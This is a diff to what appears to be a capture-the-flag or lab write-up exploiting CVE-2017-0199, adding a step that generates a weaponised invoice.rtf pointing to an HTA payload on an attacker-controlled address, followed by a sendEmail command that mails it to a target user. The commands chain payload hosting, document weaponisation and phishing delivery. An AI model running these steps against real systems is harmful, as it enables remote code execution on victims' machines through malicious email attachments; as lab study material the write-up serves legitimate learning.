@@ -85,6 +85,10 @@ python3 -m http.server 80
 ```bash XX
 python cve-2017-0199_toolkit.py -M exp -t RTF -e http://10.10.16.13/alvin.hta -l /tmp/alvin.hta
 ```
+  So we need to use the `gen` mode to send the email. https://github.com/A1vinSmith/CVE-2017-0199
+  ```bash
+  python2 cve-2017-0199_toolkit.py -M gen -t RTF -w invoice.rtf -u http://10.10.16.13/alvin.hta
+  ```
 4) sendEmail
 ```bash
 sendEmail -f foo@megabank.com -t nico@megabank.com -u "U hello" -m "M goodbye" -a invoice.rtf -s $IP -v
